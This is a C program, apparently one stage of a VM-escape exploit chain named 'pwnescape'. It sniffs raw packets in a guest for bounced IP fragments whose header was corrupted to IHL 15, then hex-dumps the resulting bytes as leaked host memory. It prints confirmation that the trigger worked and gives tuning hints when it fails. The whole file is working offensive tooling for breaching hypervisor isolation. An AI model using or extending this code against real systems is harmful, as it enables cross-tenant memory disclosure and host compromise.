/* pwnescape_readback.c — capture dei frammenti bounce con IHL mutato
 * gcc -O2 -Wall -o pwnescape_readback pwnescape_readback.c
 * Usage: ./pwnescape_readback <iface> <frag_id> [timeout_sec] */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <linux/ip.h>
#include <sys/socket.h>
#include <time.h>

#define FILL_BYTE 0x41

int main(int argc, char **argv) {
    const char *ifname = argc > 1 ? argv[1] : "eth0";
    uint16_t want_id   = argc > 2 ? (uint16_t)strtoul(argv[2], NULL, 0) : 0x1337;
    int timeout        = argc > 3 ? atoi(argv[3]) : 15;

    /* ETH_P_ALL: i frame VLAN-tagged hanno skb->protocol 0x88a8/0x8100 e
     * verrebbero scartati dal filtro ETH_P_IP a livello socket */
    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (fd < 0) { perror("socket"); return 1; }
    struct sockaddr_ll sll = {0};
    sll.sll_family   = AF_PACKET;
    sll.sll_protocol = htons(ETH_P_ALL);
    sll.sll_ifindex  = (int)if_nametoindex(ifname);
    if (!sll.sll_ifindex) { fprintf(stderr, "iface %s: %s\n", ifname, strerror(errno)); return 1; }
    if (bind(fd, (struct sockaddr *)&sll, sizeof(sll)) < 0) { perror("bind"); return 1; }

    time_t t0 = time(NULL);
    uint8_t buf[9500];
    int seen_frag = 0, seen_mutated = 0;

    while (time(NULL) - t0 < timeout) {
        struct sockaddr_ll from = {0};
        socklen_t alen = sizeof(from);
        ssize_t n = recvfrom(fd, buf, sizeof(buf), 0, (struct sockaddr *)&from, &alen);
        if (n < (ssize_t)(14 + 20)) continue;

        /* scarta il proprio traffico in TX: solo RX verso di noi */
        if (from.sll_pkttype == PACKET_OUTGOING) continue;

        /* skip manuale dei tag VLAN (singolo o QinQ) */
        uint8_t *ip = buf + 14;
        uint16_t ethertype = (buf[12] << 8) | buf[13];
        while ((ethertype == 0x8100 || ethertype == 0x88a8) && (ip - buf) + 4 <= n) {
            ethertype = (ip[2] << 8) | ip[3];
            ip += 4;
        }
        if (ethertype != 0x0800) continue;
        if (n < (ip - buf) + 20) continue;   /* IP header troncato */

        uint8_t ihl = (ip[0] & 0x0f) * 4;
        uint16_t id = (ip[4] << 8) | ip[5];
        if (id != want_id) continue;
        seen_frag = 1;

        printf("[frag rx] id=0x%04x iph[0]=0x%02x ihl=%u tot_len=%u off=0x%04x\n",
               id, ip[0], ihl, (ip[2] << 8) | ip[3], (ip[6] << 8) | ip[7]);

        if (ip[0] == 0x4f) {              /* IHL 15: header driftato */
            seen_mutated = 1;
            int opts_len = ihl - 20;
            printf("  [+] IHL MUTATO (0x4f): %d byte di 'options'\n", opts_len);
            int leaked = 0;
            for (int i = 20; i < ihl; i++) {
                if (ip[i] != FILL_BYTE) leaked++;
                if ((i - 20) % 16 == 0) printf("  %02x:", i - 20);
                printf(" %02x", ip[i]);
                if ((i - 20) % 16 == 15 || i == ihl - 1) printf("\n");
            }
            printf("  ==> byte options != 0x%02x (disclosure host): %d/%d\n",
                   FILL_BYTE, leaked, opts_len);
        }
    }

    if (seen_mutated)
        printf("[+] TRIGGER CONFERMATO: header 0x4f osservato in ingresso guest\n");
    else if (seen_frag)
        printf("[-] frammenti tornati ma iph[0] != 0x4f: drift non avvenuto "
               "(tx offload attivo? decap VLAN errata? csum_start da retunare)\n");
    else
        printf("[-] nessun frammento id=0x%04x tornato: il bounce/NAT non riporta "
               "il traffico nel tap (o defrag host assente)\n", want_id);
    return seen_mutated ? 0 : 1;
}
